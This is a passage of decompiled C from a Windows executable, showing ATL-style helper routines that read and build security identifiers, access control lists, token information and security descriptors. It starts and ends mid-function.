                    // WARNING: Load size is inaccurate
    (**(code **)(*this + 8))();
    *(undefined *)((int)this + 8) = 1;
LAB_004037a7:
    uVar5 = FUN_0041a954();
    return uVar5;
  }
  FUN_00403cae(local_78);
  puVar4 = (undefined4 *)0x0;
  FID_conflict__free(*(void **)((int)this + 4));
  *(undefined4 *)((int)this + 4) = 0;
  BVar2 = GetAclInformation(param_1,local_18,0xc,AclSizeInformation);
  if (BVar2 != 0) {
    BVar2 = GetAclInformation(param_1,&local_90,4,AclRevisionInformation);
    if (BVar2 != 0) {
      *(undefined4 *)((int)this + 0xc) = local_90;
      local_84 = 0;
      if (local_18[0] != 0) {
        do {
          BVar2 = GetAce(param_1,local_84,&local_80);
          if (BVar2 == 0) goto LAB_004037ba;
          local_88 = *(undefined4 *)(local_80 + 4);
          if (*local_80 < 2) {
            FUN_00403bb5(local_78,local_80 + 8);
            this_00 = (void *)FUN_00416f82(0x74);
            if (this_00 == (void *)0x0) {
LAB_0040376b:
              local_7c = (undefined4 *)0x0;
            }
            else {
              local_7c = FUN_004043ac(this_00,(int)local_78,local_88,local_80[1],*local_80 == 0);
            }
LAB_0040376d:
            if (local_7c == (undefined4 *)0x0) goto LAB_004037bf;
            FUN_004043e6((void *)((int)this + 0x10),&local_7c);
            puVar4 = local_7c;
          }
          else if ((byte)(*local_80 - 5) < 2) {
            pbVar3 = local_80 + 0x2c;
            puVar4 = (undefined4 *)0x0;
            local_7c = (undefined4 *)0x0;
            if ((local_80[8] & 1) == 0) {
              pbVar3 = local_80 + 0x1c;
            }
            else {
              local_7c = (undefined4 *)(local_80 + 0xc);
            }
            if ((local_80[8] & 2) == 0) {
              pbVar3 = pbVar3 + -0x10;
            }
            else {
              puVar4 = (undefined4 *)
                       (local_80 + (-(uint)(local_7c != (undefined4 *)0x0) & 0x10) + 0xc);
            }
            FUN_00403bb5(local_78,pbVar3);
            local_8c = (void *)FUN_00416f82(0x7c);
            if (local_8c == (void *)0x0) goto LAB_0040376b;
            local_7c = FUN_00403552(local_8c,(int)local_78,local_88,local_80[1],*local_80 == 5,
                                    local_7c,puVar4);
            goto LAB_0040376d;
          }
          local_84 = local_84 + 1;
        } while (local_84 < local_18[0]);
        if (puVar4 != (undefined4 *)0x0) {
          (**(code **)*puVar4)(1);
        }
      }
      FUN_00404961(local_78);
      goto LAB_004037a7;
    }
  }
LAB_004037ba:
  FUN_00404184();
LAB_004037bf:
  ATL::AtlThrowImpl(-0x7ff8fff2);
  pcVar1 = (code *)swi(3);
  uVar5 = (*pcVar1)();
  return uVar5;
}



undefined8 __thiscall FUN_004037ca(void *this,int *param_1)

{
  PACL pAVar1;
  undefined4 *puVar2;
  DWORD DVar3;
  PACL *TokenInformation;
  BOOL BVar4;
  uint extraout_ECX;
  int extraout_EDX;
  undefined4 *_Memory;
  undefined8 uVar5;
  undefined4 *local_10;
  uint local_c;
  uint local_8;
  
  local_8 = DAT_00435980 ^ (uint)&stack0xfffffffc;
  if (param_1 == (int *)0x0) goto LAB_00403886;
  GetTokenInformation(*(HANDLE *)((int)this + 4),TokenDefaultDacl,(LPVOID)0x0,0,&local_c);
  TokenInformation = (PACL *)&stack0xffffffe0;
  DVar3 = GetLastError();
  if (DVar3 != 0x7a) goto LAB_00403886;
  local_10 = (undefined4 *)0x0;
  if (local_c < 0x401) {
    uVar5 = FUN_00403ae0(local_c,extraout_EDX);
    if ((char)uVar5 == '\0') goto LAB_00403833;
    FUN_0041cc70(extraout_ECX,(int)((ulonglong)uVar5 >> 0x20));
    _Memory = (undefined4 *)0x0;
  }
  else {
LAB_00403833:
    TokenInformation = (PACL *)FUN_00403b47(&local_10,local_c);
    _Memory = local_10;
  }
  if ((TokenInformation != (PACL *)0x0) &&
     (BVar4 = GetTokenInformation(*(HANDLE *)((int)this + 4),TokenDefaultDacl,TokenInformation,
                                  local_c,&local_c), BVar4 != 0)) {
    pAVar1 = *TokenInformation;
    (**(code **)(*param_1 + 8))();
    FUN_004035f0(param_1,pAVar1);
  }
  while (_Memory != (undefined4 *)0x0) {
    puVar2 = (undefined4 *)*_Memory;
    FID_conflict__free(_Memory);
    _Memory = puVar2;
  }
LAB_00403886:
  uVar5 = FUN_0041a954();
  return uVar5;
}



void __thiscall FUN_0040389c(void *this,int param_1)

{
  code *pcVar1;
  BOOL BVar2;
  uint uVar3;
  void *pDestinationSid;
  DWORD DVar4;
  void *local_c;
  void *local_8;
  
  local_c = this;
  local_8 = this;
  if (*(int *)((int)this + 4) == 0) {
LAB_004038cd:
    FUN_00403f34((int)this);
    local_8 = (void *)0x0;
LAB_004038d8:
    uVar3 = FUN_004042dd(param_1);
    if ((char)uVar3 != '\0') {
      DVar4 = GetLengthSid((PSID)(param_1 + 4));
      pDestinationSid = _malloc(DVar4);
      if (pDestinationSid == (void *)0x0) {
        DVar4 = 0x8007000e;
      }
      else {
        BVar2 = CopySid(DVar4,pDestinationSid,(PSID)(param_1 + 4));
        if (BVar2 != 0) {
          BVar2 = SetSecurityDescriptorGroup
                            (*(PSECURITY_DESCRIPTOR *)((int)this + 4),pDestinationSid,0);
          if (BVar2 != 0) {
            FID_conflict__free(local_8);
            return;
          }
        }
        DVar4 = FUN_004042f7();
        FID_conflict__free(pDestinationSid);
      }
      goto LAB_00403954;
    }
  }
  else {
    FUN_00403da1((int *)this);
    if (*(int *)((int)this + 4) == 0) goto LAB_004038cd;
    BVar2 = GetSecurityDescriptorGroup
                      (*(PSECURITY_DESCRIPTOR *)((int)this + 4),&local_8,(LPBOOL)&local_c);
    if (BVar2 != 0) goto LAB_004038d8;
    FUN_00404184();
  }
  DVar4 = 0x80004005;
LAB_00403954:
  ATL::AtlThrowImpl(DVar4);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



undefined8 __thiscall FUN_0040395a(void *this,void *param_1)

{
  undefined4 *puVar1;
  DWORD DVar2;
  PSID *TokenInformation;
  BOOL BVar3;
  uint extraout_ECX;
  int extraout_EDX;
  undefined4 *_Memory;
  undefined8 uVar4;
  undefined4 *local_10;
  uint local_c;
  uint local_8;
  
  local_8 = DAT_00435980 ^ (uint)&stack0xfffffffc;
  if (param_1 == (void *)0x0) goto LAB_00403a0c;
  GetTokenInformation(*(HANDLE *)((int)this + 4),TokenPrimaryGroup,(LPVOID)0x0,0,&local_c);
  TokenInformation = (PSID *)&stack0xffffffe0;
  DVar2 = GetLastError();
  if (DVar2 != 0x7a) goto LAB_00403a0c;
  local_10 = (undefined4 *)0x0;
  if (local_c < 0x401) {
    uVar4 = FUN_00403ae0(local_c,extraout_EDX);
    if ((char)uVar4 == '\0') goto LAB_004039c3;
    FUN_0041cc70(extraout_ECX,(int)((ulonglong)uVar4 >> 0x20));
    _Memory = (undefined4 *)0x0;
  }
  else {
LAB_004039c3:
    TokenInformation = (PSID *)FUN_00403b47(&local_10,local_c);
    _Memory = local_10;
  }
  if ((TokenInformation != (PSID *)0x0) &&
     (BVar3 = GetTokenInformation(*(HANDLE *)((int)this + 4),TokenPrimaryGroup,TokenInformation,
                                  local_c,&local_c), BVar3 != 0)) {
    FUN_00403bb5(param_1,*TokenInformation);
  }
  while (_Memory != (undefined4 *)0x0) {
    puVar1 = (undefined4 *)*_Memory;
    FID_conflict__free(_Memory);
    _Memory = puVar1;
  }
LAB_00403a0c:
  uVar4 = FUN_0041a954();
  return uVar4;
}



void __thiscall FUN_00403a22(void *this,int param_1)

{
  code *pcVar1;
  BOOL BVar2;
  uint uVar3;
  void *pDestinationSid;
  DWORD DVar4;
  void *local_c;
  void *local_8;
  
  local_c = this;
  local_8 = this;
  if (*(int *)((int)this + 4) == 0) {
LAB_00403a53:
    FUN_00403f34((int)this);
    local_8 = (void *)0x0;
LAB_00403a5e:
    uVar3 = FUN_004042dd(param_1);
    if ((char)uVar3 != '\0') {
      DVar4 = GetLengthSid((PSID)(param_1 + 4));
      pDestinationSid = _malloc(DVar4);
      if (pDestinationSid == (void *)0x0) {
        DVar4 = 0x8007000e;
      }
      else {
        BVar2 = CopySid(DVar4,pDestinationSid,(PSID)(param_1 + 4));
        if (BVar2 != 0) {
          BVar2 = SetSecurityDescriptorOwner
                            (*(PSECURITY_DESCRIPTOR *)((int)this + 4),pDestinationSid,0);
          if (BVar2 != 0) {
            FID_conflict__free(local_8);
            return;
          }
        }
        DVar4 = FUN_004042f7();
        FID_conflict__free(pDestinationSid);
      }
      goto LAB_00403ada;
    }
  }
  else {
    FUN_00403da1((int *)this);
    if (*(int *)((int)this + 4) == 0) goto LAB_00403a53;
    BVar2 = GetSecurityDescriptorOwner
                      (*(PSECURITY_DESCRIPTOR *)((int)this + 4),&local_8,(LPBOOL)&local_c);
    if (BVar2 != 0) goto LAB_00403a5e;
    FUN_00404184();
  }
  DVar4 = 0x80004005;
LAB_00403ada:
  ATL::AtlThrowImpl(DVar4);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



// WARNING: Function: __SEH_prolog4_GS replaced with injection: SEH_prolog4

undefined8 __fastcall FUN_00403ae0(uint param_1,int param_2)

{
  undefined8 uVar1;
  
  if (0x1fff < -param_1 - 1) {
    FUN_0041cc70(param_1,param_2);
  }
  uVar1 = FUN_00427d68();
  return uVar1;
}



void FUN_00403b27(void)

{
  return;
}



undefined4 * __thiscall FUN_00403b47(void *this,int param_1)

{
  code *pcVar1;
  undefined4 *puVar2;
  undefined4 *puVar3;
  
  if (7 < -param_1 - 1U) {
    puVar2 = (undefined4 *)_malloc(param_1 + 8);
    puVar3 = puVar2;
    if (puVar2 != (undefined4 *)0x0) {
                    // WARNING: Load size is inaccurate
      *puVar2 = *this;
      puVar3 = puVar2 + 2;
      *(undefined4 **)this = puVar2;
    }
    return puVar3;
  }
  ATL::AtlThrowImpl(-0x7ff8fdea);
  pcVar1 = (code *)swi(3);
  puVar3 = (undefined4 *)(*pcVar1)();
  return puVar3;
}



void __fastcall FUN_00403b85(int param_1)

{
  *(undefined4 *)(param_1 + 0x4c) = 7;
  FUN_00401ba1((int *)(param_1 + 0x50));
  FUN_00401ba1((int *)(param_1 + 0x54));
  FUN_00401ba1((int *)(param_1 + 0x58));
  FUN_00401ba1((int *)(param_1 + 0x5c));
  *(undefined *)(param_1 + 0x48) = 0;
  return;
}



void * __thiscall FUN_00403bb5(void *this,PSID param_1)

{
  if ((*(char *)((int)this + 0x48) == '\0') || ((PSID)((int)this + 4) != param_1)) {
    FUN_00403b85((int)this);
    FUN_0040419d(this,param_1);
    *(undefined4 *)((int)this + 0x4c) = 8;
  }
  return this;
}



undefined8 __thiscall FUN_00403be6(void *this,void *param_1)

{
  undefined4 *puVar1;
  DWORD DVar2;
  PSID *TokenInformation;
  BOOL BVar3;
  uint extraout_ECX;
  int extraout_EDX;
  undefined4 *_Memory;
  undefined8 uVar4;
  undefined4 *local_10;
  uint local_c;
  uint local_8;
  
  local_8 = DAT_00435980 ^ (uint)&stack0xfffffffc;
  if (param_1 == (void *)0x0) goto LAB_00403c98;
  GetTokenInformation(*(HANDLE *)((int)this + 4),TokenOwner,(LPVOID)0x0,0,&local_c);
  TokenInformation = (PSID *)&stack0xffffffe0;
  DVar2 = GetLastError();
  if (DVar2 != 0x7a) goto LAB_00403c98;
  local_10 = (undefined4 *)0x0;
  if (local_c < 0x401) {
    uVar4 = FUN_00403ae0(local_c,extraout_EDX);
    if ((char)uVar4 == '\0') goto LAB_00403c4f;
    FUN_0041cc70(extraout_ECX,(int)((ulonglong)uVar4 >> 0x20));
    _Memory = (undefined4 *)0x0;
  }
  else {
LAB_00403c4f:
    TokenInformation = (PSID *)FUN_00403b47(&local_10,local_c);
    _Memory = local_10;
  }
  if ((TokenInformation != (PSID *)0x0) &&
     (BVar3 = GetTokenInformation(*(HANDLE *)((int)this + 4),TokenOwner,TokenInformation,local_c,
                                  &local_c), BVar3 != 0)) {
    FUN_00403bb5(param_1,*TokenInformation);
  }
  while (_Memory != (undefined4 *)0x0) {
    puVar1 = (undefined4 *)*_Memory;
    FID_conflict__free(_Memory);
    _Memory = puVar1;
  }
LAB_00403c98:
  uVar4 = FUN_0041a954();
  return uVar4;
}



undefined4 * __fastcall FUN_00403cae(undefined4 *param_1)

{
  int *piVar1;
  
  *param_1 = &PTR__scalar_deleting_destructor__0042f164;
  *(undefined *)(param_1 + 0x12) = 0;
  param_1[0x13] = 7;
  piVar1 = (int *)FUN_0040139e();
  CSimpleStringT__(param_1 + 0x14,piVar1);
  piVar1 = (int *)FUN_0040139e();
  CSimpleStringT__(param_1 + 0x15,piVar1);
  piVar1 = (int *)FUN_0040139e();
  CSimpleStringT__(param_1 + 0x16,piVar1);
  piVar1 = (int *)FUN_0040139e();
  CSimpleStringT__(param_1 + 0x17,piVar1);
  return param_1;
}



bool __thiscall FUN_00403cfe(void *this,DWORD param_1,HANDLE param_2)

{
  HANDLE ProcessHandle;
  BOOL BVar1;
  
  ProcessHandle = param_2;
  if (param_2 == (HANDLE)0x0) {
    ProcessHandle = GetCurrentProcess();
  }
  BVar1 = OpenProcessToken(ProcessHandle,param_1,&param_2);
  if (BVar1 != 0) {
                    // WARNING: Load size is inaccurate
    (**(code **)(*this + 4))();
    *(HANDLE *)((int)this + 4) = param_2;
  }
  return BVar1 != 0;
}



undefined4 * __thiscall FUN_00403d3b(void *this,byte param_1)

{
  *(undefined ***)this = &PTR_FUN_0042f0f4;
  FUN_00403d60((int)this);
  if ((param_1 & 1) != 0) {
    FID_conflict__free(this);
  }
  return (undefined4 *)this;
}



void __fastcall FUN_00403d60(int param_1)

{
  if (*(int *)(param_1 + 8) != 0) {
    if (*(int *)(param_1 + 4) != 0) {
      UnloadUserProfile(*(undefined4 *)(param_1 + 4),*(undefined4 *)(param_1 + 8));
    }
    *(undefined4 *)(param_1 + 8) = 0;
  }
  if (*(int *)(param_1 + 4) != 0) {
    CloseHandle(*(HANDLE *)(param_1 + 4));
    *(undefined4 *)(param_1 + 4) = 0;
  }
  FID_conflict__free(*(void **)(param_1 + 0xc));
  *(undefined4 *)(param_1 + 0xc) = 0;
  return;
}



void __fastcall FUN_00403da1(int *param_1)

{
  code *pcVar1;
  size_t sVar2;
  void *_Memory;
  undefined4 uVar3;
  DWORD DVar4;
  BOOL BVar5;
  PACL pSacl;
  size_t local_2c;
  size_t local_28;
  PACL local_24;
  void *local_20;
  void *local_1c;
  void *local_18;
  size_t local_14;
  size_t local_10;
  size_t local_c;
  ushort local_8 [2];
  
  pSacl = (PACL)0x0;
  if (param_1[1] == 0) {
    return;
  }
  uVar3 = FUN_00404a2c(param_1,local_8);
  if ((char)uVar3 == '\0') {
    DVar4 = 0x80004005;
  }
  else {
    if ((local_8[0] & 0x8000) == 0) {
      return;
    }
    local_10 = 0;
    local_14 = 0;
    local_c = 0;
    local_28 = 0;
    local_2c = 0;
    MakeAbsoluteSD((PSECURITY_DESCRIPTOR)param_1[1],(PSECURITY_DESCRIPTOR)0x0,&local_2c,(PACL)0x0,
                   &local_14,(PACL)0x0,&local_10,(PSID)0x0,&local_28,(PSID)0x0,&local_c);
    DVar4 = GetLastError();
    if (DVar4 != 0x7a) goto LAB_00403f2e;
    local_1c = _malloc(local_2c);
    sVar2 = local_28;
    if (local_28 == 0) {
      local_20 = (void *)0x0;
    }
    else {
      local_20 = _malloc(local_28);
    }
    if (local_c == 0) {
      local_18 = (void *)0x0;
    }
    else {
      local_18 = _malloc(local_c);
    }
    if (local_14 == 0) {
      local_24 = (PACL)0x0;
    }
    else {
      local_24 = (PACL)_malloc(local_14);
    }
    if (local_10 != 0) {
      pSacl = (PACL)_malloc(local_10);
    }
    _Memory = local_18;
    if ((((local_1c == (PSECURITY_DESCRIPTOR)0x0) || ((sVar2 != 0 && (local_20 == (PSID)0x0)))) ||
        ((local_c != 0 && (local_18 == (void *)0x0)))) ||
       (((local_14 != 0 && (local_24 == (PACL)0x0)) || ((local_10 != 0 && (pSacl == (PACL)0x0))))))
    {
      DVar4 = 0x8007000e;
    }
    else {
      BVar5 = MakeAbsoluteSD((PSECURITY_DESCRIPTOR)param_1[1],local_1c,&local_2c,local_24,&local_14,
                             pSacl,&local_10,local_20,&local_28,local_18,&local_c);
      if (BVar5 != 0) {
        (**(code **)(*param_1 + 4))();
        param_1[1] = (int)local_1c;
        return;
      }
      DVar4 = FUN_004042f7();
    }
    FID_conflict__free(local_1c);
    FID_conflict__free(local_20);
    FID_conflict__free(_Memory);
    FID_conflict__free(local_24);
    FID_conflict__free(pSacl);
  }
  ATL::AtlThrowImpl(DVar4);
LAB_00403f2e:
  FUN_00404184();
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



void __fastcall FUN_00403f34(int param_1)

{
  code *pcVar1;
  void *pSecurityDescriptor;
  BOOL BVar2;
  DWORD DVar3;
  
  pSecurityDescriptor = _malloc(0x14);
  *(void **)(param_1 + 4) = pSecurityDescriptor;
  if (pSecurityDescriptor == (void *)0x0) {
    DVar3 = 0x8007000e;
  }
  else {
    BVar2 = InitializeSecurityDescriptor(pSecurityDescriptor,1);
    if (BVar2 != 0) {
      return;
    }
    DVar3 = FUN_004042f7();
    FID_conflict__free(*(void **)(param_1 + 4));
    *(undefined4 *)(param_1 + 4) = 0;
  }
  ATL::AtlThrowImpl(DVar3);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



undefined8 __fastcall FUN_00403f79(int *param_1)

{
  code *pcVar1;
  PACL pAcl;
  BOOL BVar2;
  undefined8 uVar3;
  undefined local_14 [12];
  uint local_8;
  
  local_8 = DAT_00435980 ^ (uint)&stack0xfffffffc;
  pAcl = (PACL)FUN_00403fc6(param_1);
  if (pAcl == (PACL)0x0) {
    ATL::AtlThrowImpl(-0x7fffbffb);
  }
  else {
    BVar2 = GetAclInformation(pAcl,local_14,0xc,AclSizeInformation);
    if (BVar2 != 0) {
      uVar3 = FUN_0041a954();
      return uVar3;
    }
  }
  FUN_00404184();
  pcVar1 = (code *)swi(3);
  uVar3 = (*pcVar1)();
  return uVar3;
}



int __fastcall FUN_00403fc6(int *param_1)

{
  code *pcVar1;
  uint uVar2;
  int *piVar3;
  int iVar4;
  PACL pAcl;
  BOOL BVar5;
  DWORD DVar6;
  LPVOID pAceList;
  size_t _Size;
  uint uVar7;
  
  if ((param_1[1] == 0) && (*(char *)(param_1 + 2) == '\0')) {
    _Size = 8;
    uVar2 = (**(code **)(*param_1 + 4))();
    uVar7 = 0;
    if (uVar2 != 0) {
      do {
        piVar3 = (int *)(**(code **)(*param_1 + 0x10))(uVar7);
        if (piVar3 != (int *)0x0) {
          iVar4 = (**(code **)(*piVar3 + 8))();
          _Size = _Size + iVar4;
        }
        uVar7 = uVar7 + 1;
      } while (uVar7 < uVar2);
    }
    pAcl = (PACL)_malloc(_Size);
    param_1[1] = (int)pAcl;
    if (pAcl == (PACL)0x0) {
      DVar6 = 0x8007000e;
    }
    else {
      BVar5 = InitializeAcl(pAcl,_Size,param_1[3]);
      if (BVar5 != 0) {
        (**(code **)(*param_1 + 0x14))();
        uVar7 = 0;
        if (uVar2 != 0) {
          do {
            piVar3 = (int *)(**(code **)(*param_1 + 0x10))(uVar7);
            if (piVar3 == (int *)0x0) goto LAB_0040402c;
            DVar6 = (**(code **)(*piVar3 + 8))();
            pAceList = (LPVOID)(**(code **)(*piVar3 + 4))();
            BVar5 = AddAce((PACL)param_1[1],param_1[3],0xffffffff,pAceList,DVar6);
            if (BVar5 == 0) goto LAB_0040402c;
            uVar7 = uVar7 + 1;
          } while (uVar7 < uVar2);
        }
        goto LAB_0040408c;
      }
LAB_0040402c:
      DVar6 = FUN_004042f7();
      FID_conflict__free((void *)param_1[1]);
      param_1[1] = 0;
    }
    ATL::AtlThrowImpl(DVar6);
    pcVar1 = (code *)swi(3);
    iVar4 = (*pcVar1)();
    return iVar4;
  }
LAB_0040408c:
  return param_1[1];
}



void __thiscall FUN_0040409f(void *this,int *param_1)

{
  code *pcVar1;
  BOOL BVar2;
  int iVar3;
  PACL pDacl;
  undefined8 uVar4;
  DWORD DVar5;
  BOOL local_10;
  BOOL local_c;
  PACL local_8;
  
  if (*(int *)((int)this + 4) != 0) {
    FUN_00403da1((int *)this);
  }
  local_8 = (PACL)0x0;
  if (*(int *)((int)this + 4) != 0) {
    BVar2 = GetSecurityDescriptorDacl
                      (*(PSECURITY_DESCRIPTOR *)((int)this + 4),&local_10,&local_8,&local_c);
    if (BVar2 != 0) goto LAB_004040e4;
    FUN_00404184();
LAB_00404179:
    DVar5 = 0x8007000e;
    goto LAB_0040417e;
  }
  FUN_00403f34((int)this);
LAB_004040e4:
  if (*(char *)(param_1 + 2) == '\0') {
    iVar3 = (**(code **)(*param_1 + 4))();
    if (iVar3 == 0) goto LAB_0040412d;
    uVar4 = FUN_00403f79(param_1);
    pDacl = (PACL)_malloc((size_t)uVar4);
    if (pDacl == (PACL)0x0) goto LAB_00404179;
    FUN_00403fc6(param_1);
    iVar3 = FUN_00423348((size_t)uVar4);
    ATL::AtlCrtErrorCheck(iVar3);
  }
  else {
LAB_0040412d:
    pDacl = (PACL)0x0;
  }
  if ((*(char *)(param_1 + 2) == '\0') && (pDacl == (PACL)0x0)) {
    BVar2 = 0;
  }
  else {
    BVar2 = 1;
  }
  BVar2 = SetSecurityDescriptorDacl(*(PSECURITY_DESCRIPTOR *)((int)this + 4),BVar2,pDacl,0);
  if (BVar2 != 0) {
    FID_conflict__free(local_8);
    return;
  }
  DVar5 = FUN_004042f7();
  FID_conflict__free(pDacl);
LAB_0040417e:
  ATL::AtlThrowImpl(DVar5);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



void FUN_00404184(void)

{
  code *pcVar1;
  DWORD DVar2;
  
  DVar2 = GetLastError();
  if (0 < (int)DVar2) {
    DVar2 = DVar2 & 0xffff | 0x80070000;
  }
  ATL::AtlThrowImpl(DVar2);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



void __thiscall FUN_0040419d(void *this,PSID param_1)

{
  code *pcVar1;
  BOOL BVar2;
  DWORD DVar3;
  
  BVar2 = IsValidSid(param_1);
  if (BVar2 != 0) {
    DVar3 = GetLengthSid(param_1);
    if (DVar3 < 0x45) {
      *(undefined *)((int)this + 0x48) = 1;
      BVar2 = CopySid(DVar3,(PSID)((int)this + 4),param_1);
      if (BVar2 != 0) {
        return;
      }
      DVar3 = FUN_004042f7();
      *(undefined *)((int)this + 0x48) = 0;
      goto LAB_004041ec;
    }
  }
  DVar3 = 0x80070057;
LAB_004041ec:
  ATL::AtlThrowImpl(DVar3);
  pcVar1 = (code *)swi(3);
  (*pcVar1)();
  return;
}



undefined8 __cdecl FUN_004041f2(undefined4 *param_1,PSID_IDENTIFIER_AUTHORITY param_2,uint param_3)

{
  code *pcVar1;
  int *piVar2;
  DWORD DVar3;
  BOOL BVar4;
  uint uVar5;
  PDWORD pDVar6;
  DWORD nSubAuthority;
  DWORD *pDVar7;
  undefined8 uVar8;
  undefined local_4c [68];
  uint local_8;
  
  local_8 = DAT_00435980 ^ (uint)&stack0xfffffffc;
  nSubAuthority = 0;
  *param_1 = &PTR__scalar_deleting_destructor__0042f164;
  *(undefined *)(param_1 + 0x12) = 0;
  param_1[0x13] = 7;
  piVar2 = (int *)FUN_0040139e();
  CSimpleStringT__(param_1 + 0x14,piVar2);
  piVar2 = (int *)FUN_0040139e();
  CSimpleStringT__(param_1 + 0x15,piVar2);
  piVar2 = (int *)FUN_0040139e();
  CSimpleStringT__(param_1 + 0x16,piVar2);
  piVar2 = (int *)FUN_0040139e();
  CSimpleStringT__(param_1 + 0x17,piVar2);
  if (((UCHAR)param_3 != '\0') && (DVar3 = GetSidLengthRequired((UCHAR)param_3), DVar3 < 0x45)) {
    BVar4 = InitializeSid(local_4c,param_2,(BYTE)param_3);
    if (BVar4 != 0) {
      uVar5 = param_3 & 0xff;
      if (uVar5 != 0) {
        pDVar7 = &param_3;
        do {
          pDVar7 = pDVar7 + 1;
          pDVar6 = GetSidSubAuthority(local_4c,nSubAuthority);
          nSubAuthority = nSubAuthority + 1;
          *pDVar6 = *pDVar7;
        } while (nSubAuthority < uVar5);
      }
      FUN_0040419d(param_1,local_4c);
      param_1[0x13] = 8;
      uVar8 = FUN_0041a954();
      return uVar8;
    }
    FUN_00404184();
  }
  ATL::AtlThrowImpl(-0x7ff8ffa9);
  pcVar1 = (code *)swi(3);
  uVar8 = (*pcVar1)();
  return uVar8;
}



uint __fastcall FUN_004042dd(int param_1)

{
  uint in_EAX;
  BOOL BVar1;
  
  if (*(char *)(param_1 + 0x48) == '\0') {
    return in_EAX & 0xffffff00;
  }
  BVar1 = IsValidSid((PSID)(param_1 + 4));
  return (uint)(BVar1 != 0);
}



DWORD FUN_004042f7(void)

{
  DWORD DVar1;
  
  DVar1 = GetLastError();
  if (0 < (int)DVar1) {
    DVar1 = DVar1 & 0xffff | 0x80070000;
  }
  return DVar1;
}



undefined4 * __thiscall FUN_0040430a(void *this,int param_1)

{
  code *pcVar1;
  int **ppiVar2;
  int *piVar3;
  uint uVar4;
  DWORD DVar5;
  BOOL BVar6;
  undefined4 *puVar7;
  
  *(undefined ***)this = &PTR__scalar_deleting_destructor__0042f164;
  *(undefined *)((int)this + 0x48) = *(undefined *)(param_1 + 0x48);
  *(undefined4 *)((int)this + 0x4c) = *(undefined4 *)(param_1 + 0x4c);
  ppiVar2 = FUN_00401aca((int **)(*(int *)(param_1 + 0x50) + -0x10));
  *(int ***)((int)this + 0x50) = ppiVar2 + 4;
  ppiVar2 = FUN_00401aca((int **)(*(int *)(param_1 + 0x54) + -0x10));
  *(int ***)((int)this + 0x54) = ppiVar2 + 4;
  ppiVar2 = FUN_00401aca((int **)(*(int *)(param_1 + 0x58) + -0x10));
  *(int ***)((int)this + 0x58) = ppiVar2 + 4;
  piVar3 = (int *)FUN_0040139e();
  CSimpleStringT__((void *)((int)this + 0x5c),piVar3);
  if (*(char *)(param_1 + 0x48) == '\0') {
    return (undefined4 *)this;
  }
  uVar4 = FUN_004042dd(param_1);
  if ((char)uVar4 == '\0') {
    DVar5 = 0x80070057;
  }
  else {
    DVar5 = GetLengthSid((PSID)(param_1 + 4));
    BVar6 = CopySid(DVar5,(PSID)((int)this + 4),(PSID)(param_1 + 4));
    if (BVar6 != 0) {
      return (undefined4 *)this;
    }
    DVar5 = FUN_004042f7();
  }
  ATL::AtlThrowImpl(DVar5);
  pcVar1 = (code *)swi(3);
  puVar7 = (undefined4 *)(*pcVar1)();
  return puVar7;
}



undefined4 * __thiscall
FUN_004043ac(void *this,int param_1,undefined4 param_2,undefined param_3,undefined param_4)

{
  *(undefined ***)this = &PTR_FUN_0042f148;
  FUN_0040430a((void *)((int)this + 4),param_1);
  *(undefined4 *)((int)this + 0x6c) = 0;
  *(undefined4 *)((int)this + 100) = param_2;
  *(undefined *)((int)this + 0x68) = param_3;
  *(undefined *)((int)this + 0x70) = param_4;
  *(undefined ***)this = &PTR_FUN_0042f12c;
  return (undefined4 *)this;
}



uint __thiscall FUN_004043e6(void *this,undefined4 *param_1)

{
  undefined4 *puVar1;
  undefined4 uVar2;
  code *pcVar3;
  bool bVar4;
  uint uVar5;
  
  uVar5 = *(uint *)((int)this + 4);
  if (*(uint *)((int)this + 8) <= uVar5) {
    bVar4 = ATL::CAtlArray<void*,class_ATL::CElementTraits<void*>_>::GrowBuffer
                      ((CAtlArray_void__class_ATL__CElementTraits_void____ *)this,uVar5 + 1);
    if (bVar4 == false) {
      ATL::AtlThrowImpl(-0x7ff8fff2);
      pcVar3 = (code *)swi(3);
      uVar5 = (*pcVar3)();
      return uVar5;
    }
  }
                    // WARNING: Load size is inaccurate
  puVar1 = (undefined4 *)(*this + uVar5 * 4);
  if (puVar1 != (undefined4 *)0x0) {
    uVar2 = *param_1;
    *param_1 = 0;
    *puVar1 = uVar2;
  }
  *(int *)((int)this + 4) = *(int *)((int)this + 4) + 1;
  return uVar5;
}



uint __thiscall FUN_0040442b(void *this,undefined4 *param_1,undefined4 param_2,undefined4 param_3)

{
  code *pcVar1;
  uint uVar2;
  void *this_00;
  
  uVar2 = FUN_004042dd((int)param_1);
  if ((char)uVar2 != '\0') {
    if (*(char *)((int)this + 8) != '\0') {
                    // WARNING: Load size is inaccurate
      (**(code **)(*this + 8))();
      *(undefined *)((int)this + 8) = 0;
    }
    this_00 = (void *)FUN_00416f82(0x74);
    if (this_00 == (void *)0x0) {
      param_1 = (undefined4 *)0x0;
    }
    else {
      param_1 = FUN_004043ac(this_00,(int)param_1,param_2,(char)param_3,1);
    }
    if (param_1 == (undefined4 *)0x0) {
      ATL::AtlThrowImpl(-0x7ff8fff2);
      pcVar1 = (code *)swi(3);
      uVar2 = (*pcVar1)();
      return uVar2;
    }
    uVar2 = FUN_004043e6((void *)((int)this + 0x10),&param_1);
    FID_conflict__free(*(void **)((int)this + 4));
    *(undefined4 *)((int)this + 4) = 0;
    if (param_1 != (undefined4 *)0x0) {
      uVar2 = (**(code **)*param_1)(1);
    }
    uVar2 = CONCAT31((int3)(uVar2 >> 8),1);
  }
  return uVar2;
}



void __fastcall FUN_004044af(undefined4 *param_1)

{
  *param_1 = &PTR_FUN_0042f114;
  FUN_004045bd((int)param_1);
  if (param_1[4] != 0) {
    FUN_004049bc(param_1[4],param_1[5]);
    FID_conflict__free((void *)param_1[4]);
  }
  *param_1 = &PTR_FUN_0042f0fc;
  FID_conflict__free((void *)param_1[1]);
  return;
}



undefined4 * __thiscall FUN_004044e6(void *this,byte param_1)

{
  *(undefined ***)this = &PTR_FUN_0042f0fc;
  FID_conflict__free(*(void **)((int)this + 4));
  if ((param_1 & 1) != 0) {
    FID_conflict__free(this);
  }
  return (undefined4 *)this;
}



undefined4 * __thiscall FUN_00404510(void *this,byte param_1)

{
